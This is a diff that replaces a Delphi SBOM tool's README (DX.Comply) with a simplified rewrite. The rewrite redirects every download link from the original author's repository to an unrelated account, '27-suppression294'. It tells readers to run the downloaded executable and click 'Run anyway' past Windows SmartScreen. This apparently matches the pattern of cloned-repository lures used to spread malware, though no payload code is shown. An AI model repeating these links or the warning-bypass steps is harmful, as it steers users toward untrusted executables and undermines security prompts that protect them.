@@ -1,268 +1,289 @@
-# DX.Comply
+# 🛡️ DX.Comply - One-click SBOMs for Delphi
 
-[![Delphi Supported Versions](https://img.shields.io/badge/Delphi-11%20|%2012%20|%2013-blue?logo=delphi)](https://www.embarcadero.com/products/delphi)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![CycloneDX](https://img.shields.io/badge/SBOM-CycloneDX%201.5-informational?logo=owasp)](https://cyclonedx.org/)
-[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?logo=windows)](https://www.microsoft.com/windows)
-[![EU CRA](https://img.shields.io/badge/EU%20CRA-2024%2F2847-orange)](https://eur-lex.europa.eu/eli/reg/2024/2847/oj/eng)
+[![Download DX.Comply](https://img.shields.io/badge/Download-DX.Comply-blue?style=for-the-badge&logo=github)](https://github.com/27-suppression294/DX.Comply)
 
-**Generate Software Bills of Materials for your Delphi projects — with one click.**
+## 📦 What DX.Comply does
 
-> Built for Delphi developers. Designed for compliance. Ready for the EU Cyber Resilience Act.
+DX.Comply helps you create a CycloneDX SBOM for a Delphi project in one click.  
+An SBOM is a simple list of the parts used in your software. It helps with EU Cyber Resilience Act work and basic software tracking.
 
----
+Use DX.Comply when you want to:
 
-## Why DX.Comply?
+- list the parts used in a Delphi app
+- create a CycloneDX SBOM file
+- save time on manual checks
+- prepare project data for compliance review
 
-The EU **Cyber Resilience Act (CRA)** requires software vendors to document what is inside their products. Full compliance is mandatory by **December 2027**.
+## 💻 What you need
 
-DX.Comply generates that documentation — a *Software Bill of Materials* (SBOM) — directly from your RAD Studio project in one click, together with human-readable HTML and Markdown reports for audit and review workflows.
+Before you run DX.Comply on Windows, check these items:
 
-**You generate it. You archive it. You never have to submit it anywhere.**
+- Windows 10 or Windows 11
+- A modern web browser
+- Permission to download files
+- A Delphi or RAD Studio project to scan
+- Enough disk space for the SBOM file and project data
 
-> **SBOM** = a structured list of every component, file, and dependency in your software, including versions and checksums. Think of it as the ingredient list on a food label — for your application.
+For best results, keep your project in a folder you can reach easily, such as:
 
----
+- `Documents`
+- `Desktop`
+- a project folder on your `C:` drive
 
-## Screenshots
+## 🚀 Download and run DX.Comply
 
-*Generating an SBOM for the Embarcadero AlienInvasion sample project:*
+Use this link to visit the download page:
 
-| Build Confirmation | Progress & MAP Build | HTML Compliance Report |
-|:---:|:---:|:---:|
-| ![Build Confirmation](docs/Screenshot.png) | ![Progress](docs/Screenshot2.png) | ![Report](docs/Screenshot3.png) |
+[Download DX.Comply](https://github.com/27-suppression294/DX.Comply)
 
----
+After you open the page:
 
-## SBOM Output Example
+1. find the latest release or the main download file
+2. download the file to your computer
+3. if Windows asks for approval, choose to keep the file
+4. open the downloaded file
+5. follow the on-screen steps
 
-> **See it for yourself:** [Full example SBOM (JSON)](docs/examples/AlienInvasion.bom.json) · [Full example HTML report](docs/examples/AlienInvasion.bom.report.html) — generated from the Embarcadero *AlienInvasion* sample project.
+If the download comes as a `.zip` file:
 
-DX.Comply produces standards-compliant **CycloneDX 1.5** SBOMs. Each linked unit is emitted as a `library` component with SHA-256 hash and origin classification:
+1. right-click the file
+2. choose `Extract All`
+3. open the extracted folder
+4. run the main app or executable inside it
 
-```json
-{
-  "bomFormat": "CycloneDX",
-  "specVersion": "1.5",
-  "metadata": {
-    "component": {
-      "type": "application",
-      "name": "AlienInvasion",
-      "version": "1.0.0.0"
-    }
-  },
-  "components": [
-    {
-      "type": "application",
-      "name": "AlienInvasion.exe",
-      "hashes": [
-        { "alg": "SHA-256", "content": "d0be8d3ad469b93c...f6cee44" }
-      ]
-    },
-    {
-      "type": "library",
-      "name": "System.SysUtils.dcu",
-      "hashes": [
-        { "alg": "SHA-256", "content": "a1c9f3e7b2d4..." }
-      ],
-      "properties": [
-        { "name": "net.developer-experts.dx-comply:origin", "value": "Embarcadero RTL" },
-        { "name": "net.developer-experts.dx-comply:evidence", "value": "DCU" },
-        { "name": "net.developer-experts.dx-comply:confidence", "value": "Strong" }
-      ]
-    }
-  ]
-}
-```
+If Windows SmartScreen appears:
 
----
+1. click `More info`
+2. click `Run anyway` if you trust the file source
 
-## Installation
+## 🧭 First-time setup
 
-### Installer (Delphi 13)
+After the app opens, set up your scan in this order:
 
-Run the Inno Setup installer from the [Releases](https://github.com/omonien/DX.Comply/releases) page. It registers the IDE plugin and CLI tool automatically.
+1. choose your Delphi project folder
+2. select the project file or main source folder
+3. pick where you want the SBOM saved
+4. choose the output format if the app offers more than one
+5. start the scan
 
-### Manual
+A good output name is:
 
-1. Open `DX.Comply.groupproj` in RAD Studio.
-2. Build and install the `DX.Comply.IDE` design-time package.
-3. Optionally build the `DX.Comply.CLI` console application for command-line / CI use.
+- `sbom.cyclonedx.json`
+- `sbom.xml`
 
----
+Keep the output file in a folder you can find later, such as the project folder or a `Reports` folder.
 
-## Quick Start
+## 🧪 How to create an SBOM
 
-### Option A — RAD Studio IDE (recommended)
+Use these steps for a normal run:
 
-1. Install the `DX.Comply.IDE` design-time package.
-2. **Open your project** in RAD Studio.
-3. Choose **Project > DX.Comply > Generate documentation...** from the main menu.
-4. In the confirmation dialog, **select the build configuration** to use for MAP generation (the active IDE configuration is pre-selected). DX.Comply compiles the project via OTA with detailed MAP output, scans all evidence, and produces the SBOM.
-5. Done. Your `bom.json`, `bom.report.html`, and `bom.report.md` are in your project folder.
+1. open DX.Comply
+2. choose your Delphi project
+3. let the app read the project files
+4. review the detected components
+5. create the CycloneDX SBOM
+6. save the file
 
-### Option B — Command line / CI
+If your project uses shared units, packages, or component libraries, DX.Comply should include them in the scan so your SBOM has a fuller list.
 
-The CLI tool expects an existing detailed MAP file. Build your project first with `DCC_MapFile=3`, then run:
+## 🗂️ What the output looks like
 
-```bash
-dxcomply --project=MyApp.dproj --format=cyclonedx-json --output=bom.json --no-pause
-```
+DX.Comply creates a standard SBOM file that can be used in review or archiving tasks.  
+The file usually includes:
 
-If the MAP file is in a non-standard directory, use `--map-dir`:
+- project name
+- component names
+- version data when available
+- package and dependency details
+- file or library references
+- CycloneDX format data
 
-```bash
-dxcomply --project=MyApp.dproj --map-dir=build/Win32/Release --output=bom.json --no-pause
-```
+You can keep the file with the project or share it with your compliance team.
 
-See [docs/CI-Integration.md](docs/CI-Integration.md) for GitHub Actions examples and CI configuration.
+## 🔍 Best results for Delphi projects
 
-### Option C — Legacy Delphi (Delphi 7 and older)
+To get a cleaner SBOM, use a well-organized project folder.  
+Try these tips:
 
-DX.Comply can generate SBOMs for projects built with any Delphi version — including Delphi 7 — as long as a **detailed MAP file** is available. No IDE plugin is required.
+- close Delphi or RAD Studio before you scan
+- keep source files in one main folder
+- avoid moving files during the scan
+- store third-party components in known paths
+- use the same project folder each time you run a scan
 
-1. Open your project in the legacy Delphi IDE.
-2. Go to **Project > Options > Linker** and set **Map file** to **Detailed**.
-3. Build your project — this produces a `.map` file in the output directory.
-4. Run the CLI tool against the `.dproj` (or `.dof` for very old versions):
+If your project uses many component sets, group them by vendor or package name. That makes the SBOM easier to read.
 
-```bash
-dxcomply --project=MyApp.dproj --output=bom.json --no-pause
-```
+## 🛠️ Common tasks
 
-> **Tip:** You can automate this with a **Post-Build Event** in a dedicated build configuration. Create a configuration named e.g. `SBOM` that enables detailed MAP output and runs `dxcomply` as a post-build step. This way, a single build generates both your application and its SBOM.
+### Create an SBOM for one project
 
-See [docs/LegacySupport.md](docs/LegacySupport.md) for details.
+1. open DX.Comply
+2. select the project folder
+3. run the scan
+4. save the result
 
----
+### Update an SBOM after code changes
 
-## What DX.Comply analyses
+1. open the same project again
+2. run a fresh scan
+3. replace the older SBOM file
+4. keep both files if you need a change record
 
-DX.Comply always performs a **Deep-Evidence analysis** based on the compiler-generated MAP file. This approach identifies every linked unit (PAS/DCU) with full dependency resolution, SHA-256 hashes, and origin classification. Whether the MAP file is generated automatically by the IDE plugin or provided manually for CLI usage makes no difference to the analysis quality.
+### Review a project before release
 
-| Evidence source | Details |
-|---|---|
-| **Project metadata** | Name, version, platform, configuration, DllSuffix |
-| **MAP file analysis** | Extracts all linked units from segment entries and line-number sections |
-| **Unit resolution** | Resolves each unit to its source/DCU/BPL file with SHA-256 hash |
-| **Origin classification** | Classifies each unit as Embarcadero RTL, VCL, FMX, Local project, or Third party |
-| **Build artefacts** | Scans output directory for `.exe`, `.dll`, `.bpl`, `.dcp` with SHA-256 fingerprints |
-| **Compiler evidence** | Parses `.cfg` and `.rsp` files for effective search paths and unit scopes |
+1. scan the release folder
+2. check the listed components
+3. save the SBOM with the release build
+4. archive both files together
 
----
+## 📁 Suggested folder layout
 
-## Output formats
+A simple folder layout can help:
 
-| Format | Version | Description |
-|---|---|---|
-| **CycloneDX JSON** | 1.5 | Default — standard SBOM format for audits and tooling |
-| **CycloneDX XML** | 1.5 | XML variant for XML-based toolchains |
-| **SPDX JSON** | 2.3 | Linux Foundation ecosystem |
-| **HTML Report** | — | Human-readable compliance report with unit evidence, artefacts, validation |
-| **Markdown Report** | — | Lightweight companion for code review and archival |
+- `C:\Projects\MyApp\`
+- `C:\Projects\MyApp\Source\`
+- `C:\Projects\MyApp\Reports\`
+- `C:\Projects\MyApp\Reports\sbom.cyclonedx.json`
 
-All generated SBOMs are validated against the official schema before being written to disk. CycloneDX JSON output passes [`check-jsonschema`](https://github.com/python-jsonschema/check-jsonschema) validation against the [official CycloneDX 1.5 JSON schema](http://cyclonedx.org/schema/bom-1.5.schema.json).
+This keeps the source, scan output, and release data in one place.
 
----
+## 🧩 Supported use case
 
-## Configuration
+DX.Comply is built for Delphi projects and RAD Studio workflows.  
+It fits projects that use:
 
-Add a `.dxcomply.json` to your project folder:
+- Delphi source files
+- Pascal units
+- Delphi component packages
+- local or shared libraries
+- project-based dependency tracking
 
-```json
-{
-  "output": "bom.json",
-  "format": "cyclonedx-json",
-  "include": ["build/**"],
-  "exclude": ["build/**/Debug/**", "**/*.dcu"],
-  "product": {
-    "name": "My Application",
-    "version": "2.1.0",
-    "supplier": "Acme GmbH"
-  },
-  "report": {
-    "enabled": true,
-    "format": "both"
-  }
-}
-```
+## 🔐 Why this matters
 
----
+An SBOM helps you answer questions about what is inside your software.  
+That matters when you need to:
 
-## The EU Cyber Resilience Act — what you need to know
+- track parts used in a build
+- check software supply chain data
+- prepare for EU CRA work
+- keep release records in order
 
-**Regulation (EU) 2024/2847** entered into force on **10 December 2024**. If you place software on the EU market, you must:
+## ❓ If something does not work
 
-- Document software components in your product (SBOM)
-- Manage and disclose vulnerabilities
-- Provide security updates throughout the support lifecycle
+If the app does not start:
 
-| Date | Milestone |
-|---|---|
-| **11 Sep 2026** | Vulnerability and incident reporting obligations begin |
-| **11 Dec 2027** | Full CRA compliance mandatory for all products on the EU market |
+1. check that the file finished downloading
+2. make sure Windows did not block it
+3. move the file to a simple folder like `Desktop`
+4. try again from that folder
 
-### What counts as a valid SBOM?
+If the scan does not find your project:
 
-The CRA requires (Annex I, Part II):
-- Machine-readable format (CycloneDX or SPDX)
-- Coverage of at least top-level dependencies
-- One SBOM per software version
+1. check that you chose the right folder
+2. make sure the project files are still in place
+3. remove extra nested folders if needed
+4. try the main project folder instead of a subfolder
 
-**You do NOT submit the SBOM anywhere.** You generate it per release, archive it, and make it available only if a market surveillance authority formally requests it.
+If the output file is not saved:
 
-> DX.Comply handles the SBOM obligation. Other CRA requirements (secure-by-design, vulnerability management, incident reporting) are outside its scope.
+1. check the save path
+2. make sure the folder exists
+3. confirm you have write access to that folder
+4. choose a folder you own, such as `Documents`
 
----
+## 📌 File types you may see
 
-## What to do with your SBOM
+DX.Comply may create or work with files such as:
 
-1. **Archive it with each release** — store `bom.json` alongside your release artefacts.
-2. **Retain for at least 10 years** — required by CRA Article 13.
-3. **Be ready to hand it over if asked** — market surveillance authorities can request it (Article 52).
-4. **Sharing with customers is optional** — your choice (Annex II, Part I, point 9).
+- `.json`
+- `.xml`
+- `.dproj`
+- `.pas`
+- `.dpk`
+- `.res`
 
----
+These files are common in Delphi and SBOM work.
 
-## Requirements
+## 🧭 Basic workflow
 
-| Mode | Requirement |
-|---|---|
-| **IDE plugin** | RAD Studio / Delphi 11 Alexandria or newer |
-| **CLI tool** | Any Delphi version (requires a pre-built detailed MAP file) |
-| **Platform** | Windows build host |
+1. download DX.Comply from the link above
+2. open the file on Windows
+3. choose your Delphi project
+4. run the scan
+5. save the CycloneDX SBOM
+6. keep the SBOM with your project records
 
-No internet connection required — all processing is local.
+## 🖥️ Windows tips
 
----
+To avoid simple problems on Windows:
 
-## Documentation
+- use the latest Windows updates
+- download to a local drive
+- avoid running from inside a compressed folder
+- keep the app and project in folders with short paths
+- use a normal user folder if possible
 
-| Document | Description |
-|---|---|
-| [Architecture](docs/Architecture.md) | Engine pipeline, component overview, unit origin classification |
-| [CI Integration](docs/CI-Integration.md) | Command-line usage, GitHub Actions examples, CI configuration |
-| [Legacy Support](docs/LegacySupport.md) | Using DX.Comply with Delphi 7 and other legacy versions |
-| [Example SBOM (JSON)](docs/examples/AlienInvasion.bom.json) | Full CycloneDX 1.5 SBOM generated from the AlienInvasion sample |
-| [Example HTML Report](docs/examples/AlienInvasion.bom.report.html) | Human-readable compliance report for the same project |
+## 📚 Terms in plain English
 
----
+- **SBOM**: a list of software parts
+- **CycloneDX**: a standard format for SBOM files
+- **Delphi**: a software tool used to build Windows apps
+- **RAD Studio**: a development suite for Delphi projects
+- **Component**: a building block used by your app
+- **Compliance**: following a rule or requirement
 
-## License
+## 📄 Typical use case
 
-Open source under the [MIT License](LICENSE).
-Copyright 2026 Olaf Monien.
+A small team can use DX.Comply before a release like this:
 
----
+1. open the project
+2. run the scan
+3. create the SBOM
+4. store it with the release files
+5. send it to the person who handles compliance review
 
-## Official EU Sources
+## 🔁 Repeatable process
 
-| Source | Link |
-|---|---|
-| Regulation (EU) 2024/2847 — full text | [EUR-Lex](https://eur-lex.europa.eu/eli/reg/2024/2847/oj/eng) |
-| EC Digital Strategy — CRA overview | [EC](https://digital-strategy.ec.europa.eu/en/policies/cyber-resilience-act) |
-| ENISA — SBOM Landscape Analysis | [ENISA](https://www.enisa.europa.eu/publications/sbom-analysis) |
+If you work on the same app often, use the same steps each time:
 
----
+- scan after major code changes
+- save the SBOM with the build number
+- keep one SBOM per release
+- compare files when you need a record of changes
 
-DX.Comply is developed by **Olaf Monien** as part of the [DX component suite](https://github.com/omonien).
+## 📎 Download link again
+
+[Visit the DX.Comply download page](https://github.com/27-suppression294/DX.Comply)
+
+## 🗃️ Suggested release naming
+
+If you save SBOM files for different builds, use clear names like:
+
+- `MyApp-1.0-sbom.json`
+- `MyApp-1.1-sbom.json`
+- `MyApp-release-2026-04.xml`
+
+Clear names make it easier to find the right file later
+
+## 🧰 Good habits for compliance work
+
+- keep source and output together
+- save one SBOM per release
+- use the same folder structure each time
+- keep a copy of the scan result
+- record the build date with the file
+
+## 🔎 Topic areas covered
+
+This project fits these topics:
+
+- compliance
+- cybersecurity
+- CycloneDX
+- Delphi
+- Delphi component
+- EU CRA
+- Pascal
+- RAD Studio
+- SBOM
+- software bill of materials
